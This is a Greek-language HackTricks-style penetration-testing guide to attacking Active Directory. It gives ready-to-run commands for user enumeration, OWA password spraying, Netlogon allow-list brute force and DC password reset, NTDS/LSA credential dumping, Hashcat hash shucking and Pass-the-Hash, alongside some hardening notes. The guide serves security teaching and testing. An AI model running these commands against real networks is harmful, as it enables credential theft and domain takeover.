# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** αποτελεί θεμελιώδη τεχνολογία, επιτρέποντας στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users** και **objects** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο για κλιμάκωση, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμα **groups** και **subgroups**, ενώ ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία βασικά επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή από objects, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται μέσω μιας κοινής δομής, ενώ ένα **forest** αντιπροσωπεύει τη συλλογή πολλαπλών trees, τα οποία διασυνδέονται μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα δικαιώματα **πρόσβασης** και **επικοινωνίας** μπορούν να οριστούν σε καθένα από αυτά τα επίπεδα.

Οι βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα objects του Active Directory.
2. **Object** – Αναφέρεται σε οντότητες μέσα στο directory, όπως **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως container για τα objects του directory, με τη δυνατότητα να συνυπάρχουν πολλαπλά domains μέσα σε ένα **forest**, διατηρώντας το καθένα τη δική του συλλογή objects.
4. **Tree** – Μια ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από αρκετά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει directory-enabled εφαρμογές μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την πιστοποίηση χρηστών σε πολλαπλές web εφαρμογές μέσα σε μία συνεδρία.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από copyright, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Είναι κρίσιμο για την επίλυση **domain names**.

Για μια πιο λεπτομερή εξήγηση, δείτε: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **attack an AD**, πρέπει να **κατανοήσετε** πολύ καλά τη διαδικασία **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείτε να επισκεφθείτε το [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη εικόνα των commands που μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos **requires a full qualifid name (FQDN)** για την εκτέλεση ενεργειών. Αν προσπαθήσετε να αποκτήσετε πρόσβαση σε ένα machine μέσω της IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Αν έχετε απλώς πρόσβαση σε ένα περιβάλλον AD, αλλά δεν διαθέτετε credentials/sessions, μπορείτε να:

- **Pentest το δίκτυο:**
- Κάνετε scan στο δίκτυο, να εντοπίσετε machines και open ports και να προσπαθήσετε να **εκμεταλλευτείτε vulnerabilities** ή να **εξαγάγετε credentials** από αυτά (για παράδειγμα, [οι printers μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md).
- Το Enumerating του DNS μπορεί να αποκαλύψει πληροφορίες για βασικούς servers στο domain, όπως web, printers, shares, vpn, media κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Ελέγξτε για null και Guest access σε smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο λεπτομερής οδηγός για το πώς να κάνετε enumerate έναν SMB server βρίσκεται εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο λεπτομερής οδηγός για το πώς να κάνετε enumerate το LDAP βρίσκεται εδώ (δώστε **ιδιαίτερη προσοχή στο anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison το δίκτυο**
- Συλλέξτε credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Αποκτήστε πρόσβαση σε host [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγάγετε usernames/names από εσωτερικά έγγραφα, social media και services (κυρίως web) μέσα στα domain environments, καθώς και από τις δημόσια διαθέσιμες πηγές.
- Αν βρείτε τα πλήρη ονόματα των εργαζομένων μιας εταιρείας, μπορείτε να δοκιμάσετε διαφορετικά AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Ελέγξτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username**, ο server απαντά χρησιμοποιώντας τον **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username δεν ήταν έγκυρο. Τα **valid usernames** θα προκαλέσουν είτε την επιστροφή του **TGT** σε μια απόκριση **AS-REP**, είτε το error _KRB5KDC_ERR_PREAUTH_REQUIRED_, το οποίο υποδεικνύει ότι ο user πρέπει να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση auth-level = 1 (No authentication) ενάντια στο interface MS-NRPC (Netlogon) στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` αφού γίνει binding στο interface MS-NRPC, για να ελέγξει αν υπάρχει ο user ή ο computer χωρίς credentials. Το tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα βρίσκεται [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρείτε έναν από αυτούς τους servers στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **user enumeration εναντίον του**. Για παράδειγμα, θα μπορούσατε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με usernames σε [**αυτό το github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ατόμων που εργάζονται στην εταιρεία** από το recon step που θα έπρεπε να έχετε πραγματοποιήσει πριν από αυτό. Με το όνομα και το επώνυμο, θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Ακόμη και αφού γίνει patch το **Zerologon στον DC**, οι λογαριασμοί που έχουν προστεθεί ρητά στη allow-list μπορεί να παραμένουν εκτεθειμένοι σε **legacy/vulnerable συμπεριφορά του Netlogon secure channel**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η value είναι ένας **SDDL security descriptor** (δείτε το [Security Descriptors](security-descriptors.md)). Οποιοσδήποτε λογαριασμός ή group έχει το σχετικό ACE στο DACL μπορεί να αποτελέσει στόχο. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` ουσιαστικά προσθέτει στη allow-list τους **Everyone**.

Πρακτικό workflow για τον operator:

1. **Εντοπίστε τα allow-listed principals** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live DC registry**.
2. **Κάντε resolve τα SIDs** που βρίσκονται στο SDDL σε πραγματικούς AD users/computers και δώστε προτεραιότητα σε **DC machine accounts**, **trust accounts** και άλλα privileged machines.
3. Επιχειρήστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο allow-listed account.
4. Μετά από ένα επιτυχημένο guess, κάντε abuse του **Netlogon password-setting** για να κάνετε reset το password του target account (το public PoC το ορίζει σε κενό string).<sup>[[9]](#references)[[10]](#references)</sup>

Γρήγορα παραδείγματα triage / lab από το public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Σημειώσεις:

- Ο **scanner** είναι χρήσιμος επειδή η effective allow-list μπορεί να υπάρχει στο **SYSVOL**, στο **registry** ή και στα δύο.
- Το ίδιο το exploit path είναι σημαντικό επειδή **δεν απαιτεί Domain Admin privileges** αφού εντοπιστεί ένας vulnerable account.
- Η παραβίαση ενός **Domain Controller machine account**, όπως το `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή το reset του password μπορεί να ενεργοποιήσει άμεσα ευρύτερα paths για **AD takeover**.
- Η **feasibility του brute-force** εξαρτάται από το mode: το public artifact περιγράφει μια προσέγγιση meet-in-the-middle, ένα **24-bit** brute force όταν είναι διαθέσιμος ένας ακόμη computer account και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις για detection / hardening:

- Ελέγξτε την allow-list policy και αφαιρέστε οτιδήποτε εκτός από προσωρινές, ρητά απαιτούμενες εξαιρέσεις συμβατότητας.
- Παρακολουθείτε τα DC **System** events **5827/5828/5829/5830/5831** για να εντοπίζετε vulnerable Netlogon connections που απορρίπτονται, εντοπίζονται ή επιτρέπονται ρητά από την policy.
- Θεωρήστε τα accounts στο `VulnerableChannelAllowList` **υψηλού κινδύνου** μέχρι να αφαιρεθεί η legacy dependency.

### Γνωρίζοντας ένα ή περισσότερα usernames

Εντάξει, γνωρίζετε ήδη ένα valid username αλλά δεν έχετε passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας user **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα AS_REP message** για αυτόν τον user, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα με παράγωγο του password του user.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **συνηθισμένα passwords** με καθέναν από τους discovered users· ίσως κάποιος user χρησιμοποιεί ένα αδύναμο password (λάβετε υπόψη την password policy!).
- Σημειώστε ότι μπορείτε επίσης να κάνετε **spray OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως μπορέσετε να **αποκτήσετε** κάποια challenge **hashes**, κάνοντας **poisoning** σε ορισμένα protocols του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν έχετε καταφέρει να κάνετε enumerate το active directory, θα έχετε **περισσότερα emails και καλύτερη κατανόηση του network**. Ίσως μπορέσετε να εξαναγκάσετε [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM για να αποκτήσετε πρόσβαση στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε **`nxcdb` workspaces** για να διατηρείτε την κατάσταση του AD recon ανά engagement: το `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από το `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε views με `proto smb|mssql|winrm` και εμφανίστε τα gathered secrets με `creds`. Κάντε χειροκίνητο purge των sensitive data όταν ολοκληρώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Το γρήγορο subnet discovery με **`netexec smb <cidr>`** εμφανίζει το **domain**, το **OS build**, τις **SMB signing requirements** και το **Null Auth**. Τα members που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ τα DCs συνήθως απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από το NetExec output για ευκολότερο targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay προς τον DC είναι αποκλεισμένο** λόγω signing, ελέγξτε και την κατάσταση του **LDAP**: το `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένας DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος στόχος για **relay-to-LDAP**, για καταχρήσεις όπως το **SPN-less RBCD**.

### Client-side printer credential leaks → μαζική επικύρωση διαπιστευτηρίων domain

- Οι printer/web UIs μερικές φορές **ενσωματώνουν masked κωδικούς διαχειριστή σε HTML**. Η προβολή του source/devtools μπορεί να αποκαλύψει plaintext (π.χ. `<input value="<password>">`), επιτρέποντας πρόσβαση με Basic-auth για τη σάρωση/εκτύπωση repositories.
- Τα ανακτημένα print jobs ενδέχεται να περιέχουν **έγγραφα onboarding σε plaintext** με κωδικούς ανά χρήστη. Διατηρείτε τις αντιστοιχίσεις σωστές κατά τις δοκιμές:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest user**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν αποκτηθεί με κάποιον τρόπο πρόσβαση σε αυτά, θα **πυροδοτήσουν μια NTLM authentication προς εσάς**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** για να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **hash shucking** αντιμετωπίζει κάθε NT hash που ήδη διαθέτετε ως υποψήφιο password για άλλα, πιο αργά formats, των οποίων το key material παράγεται απευθείας από το NT hash. Αντί να κάνετε brute-force σε μεγάλες passphrases μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, δίνετε τα NT hashes στα NT-candidate modes του Hashcat και το αφήνετε να επικυρώσει την επαναχρησιμοποίηση password χωρίς να μάθετε ποτέ το plaintext. Αυτό είναι ιδιαίτερα αποτελεσματικό μετά από domain compromise, όπου μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps ή credential vaults και χρειάζεται να ελέγξετε για reuse σε άλλα domains/forests.
- Συλλαμβάνετε υλικό Kerberos βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα reuse για μεγάλες, uncrackable passphrases και να κάνετε άμεσα pivot μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** ενάντια σε encryption types των οποίων τα keys δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στα κανονικά password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε το `secretsdump.py` με history για να λάβετε το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Οι history entries διευρύνουν σημαντικά το candidate pool, επειδή η Microsoft μπορεί να αποθηκεύσει έως και 24 προηγούμενα hashes ανά account. Για περισσότερους τρόπους συλλογής NTDS secrets δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – Το `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή το Mimikatz `lsadump::sam /patch`) εξάγει local SAM/SECURITY data και cached domain logons (DCC/DCC2). Αφαιρέστε τα duplicates και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Track metadata** – Διατηρήστε το username/domain που παρήγαγε κάθε hash (ακόμη και αν το wordlist περιέχει μόνο hex). Τα matching hashes σάς δείχνουν αμέσως ποιος principal επαναχρησιμοποιεί ένα password, μόλις το Hashcat εμφανίσει τον winning candidate.
- Προτιμήστε candidates από το ίδιο forest ή από ένα trusted forest· έτσι μεγιστοποιείται η πιθανότητα overlap κατά το shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμένουν raw 32-hex NT hashes**. Απενεργοποιήστε τα rule engines (χωρίς `-r` και χωρίς hybrid modes), επειδή το mangling καταστρέφει το candidate key material.
- Αυτά τα modes δεν είναι εγγενώς ταχύτερα, όμως το NTLM keyspace (~30.000 MH/s σε M3 Max) είναι περίπου 100× γρηγορότερο από το Kerberos RC4 (~300 MH/s). Ο έλεγχος μιας curated NT list είναι πολύ φθηνότερος από την εξερεύνηση ολόκληρου του password space στο αργό format.
- Εκτελείτε πάντα το **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), επειδή τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει NT mode για AS-REQ Pre-Auth, ενώ τα AES etypes (19600/19700) απαιτούν το plaintext password, επειδή τα keys τους παράγονται μέσω PBKDF2 από passwords σε UTF-16LE και όχι από raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Συλλάβετε ένα RC4 TGS για ένα target SPN με έναν low-privileged user (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Κάντε shuck στο ticket με τη NT list σας:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επικυρώνει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι το service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Κάντε άμεσα pivot μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Προαιρετικά, μπορείτε να ανακτήσετε αργότερα το plaintext με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειάζεται.

#### Example – Cached credentials (mode 31600)

1. Κάντε dump τα cached logons από ένα compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη γραμμή DCC2 του ενδιαφέροντος domain user στο `dcc2_highpriv.txt` και κάντε shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχημένο match επιστρέφει το NT hash που είναι ήδη γνωστό στη λίστα σας, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί ένα password. Χρησιμοποιήστε το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάντε brute-force σε fast NTLM mode για να ανακτήσετε το string.

Ακριβώς η ίδια διαδικασία εφαρμόζεται σε NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα match, μπορείτε να ξεκινήσετε relay, SMB/WMI/WinRM PtH ή να κάνετε εκ νέου crack στο NT hash με masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Για αυτή τη φάση πρέπει να έχετε **κάνει compromise τα credentials ή ένα session ενός έγκυρου domain account**. Αν έχετε έγκυρα credentials ή ένα shell ως domain user, **θα πρέπει να θυμάστε ότι οι επιλογές που δόθηκαν προηγουμένως εξακολουθούν να είναι διαθέσιμες για το compromise άλλων users**.

Πριν ξεκινήσετε το authenticated enumeration, θα πρέπει να γνωρίζετε τι είναι το **Kerberos double hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το compromise ενός account αποτελεί ένα **μεγάλο βήμα για να ξεκινήσετε το compromise ολόκληρου του domain**, επειδή θα μπορέσετε να ξεκινήσετε το **Active Directory Enumeration:**

Όσον αφορά το [**ASREPRoast**](asreproast.md), μπορείτε πλέον να βρείτε κάθε πιθανό vulnerable user, ενώ με το [**Password Spraying**](password-spraying.md) μπορείτε να λάβετε μια **λίστα με όλα τα usernames** και να δοκιμάσετε το password του compromised account, κενά passwords και νέα promising passwords.

- Θα μπορούσατε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε το [**powershell for recon**](../basic-powershell-for-pentesters/index.html), το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξαγάγετε πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εκπληκτικό tool για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). **Δεν είναι ιδιαίτερα stealthy** (ανάλογα με τις collection methods που χρησιμοποιείτε), αλλά **αν δεν σας ενδιαφέρει**, θα πρέπει οπωσδήποτε να το δοκιμάσετε. Βρείτε πού μπορούν οι users να κάνουν RDP, βρείτε path προς άλλα groups κ.λπ.
- **Άλλα automated AD enumeration tools είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records του AD**](ad-dns-records.md), καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **tool με GUI** που μπορείτε να χρησιμοποιήσετε για να κάνετε enumerate το directory είναι το **AdExplorer.exe** από τη σουίτα **SysInternal**.
- Μπορείτε επίσης να κάνετε search στη LDAP database με το **ldapsearch** για να αναζητήσετε credentials στα πεδία _userPassword_ και _unixUserPassword_, ή ακόμη και στο _Description_. Βλ. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να κάνετε enumerate το domain χρησιμοποιώντας το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Θα μπορούσατε επίσης να δοκιμάσετε automated tools όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Είναι πολύ εύκολο να λάβετε όλα τα domain usernames από τα Windows (`net user /domain`, `Get-DomainUser` ή `wmic useraccount get name,sid`). Στο Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμη και αν αυτή η ενότητα Enumeration φαίνεται μικρή, είναι το σημαντικότερο μέρος όλων. Αποκτήστε πρόσβαση στους συνδέσμους (κυρίως σε αυτούς των cmd, powershell, powerview και BloodHound), μάθετε πώς να κάνετε enumerate ένα domain και εξασκηθείτε μέχρι να αισθάνεστε άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον τρόπο σας προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Το Kerberoasting περιλαμβάνει τη λήψη **TGS tickets** που χρησιμοποιούνται από services συνδεδεμένα με user accounts και το cracking της κρυπτογράφησής τους — η οποία βασίζεται στα user passwords — **offline**.

Περισσότερα σχετικά με αυτό εδώ:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Μόλις αποκτήσετε κάποια credentials, μπορείτε να ελέγξετε αν έχετε πρόσβαση σε οποιοδήποτε **machine**. Για αυτόν τον σκοπό, μπορείτε να χρησιμοποιήσετε το **CrackMapExec** για να επιχειρήσετε σύνδεση σε πολλούς servers με διαφορετικά protocols, σύμφωνα με τα port scans σας.

### Local Privilege Escalation

Αν έχετε κάνει compromise credentials ή ένα session ως κανονικός domain user και έχετε **access** με αυτόν τον user σε **οποιοδήποτε machine στο domain**, θα πρέπει να προσπαθήσετε να βρείτε τον τρόπο να κάνετε **escalate privileges locally και να κάνετε looting για credentials**. Αυτό συμβαίνει επειδή μόνο με local administrator privileges θα μπορείτε να κάνετε **dump hashes άλλων users** στη μνήμη (LSASS) και τοπικά (SAM).

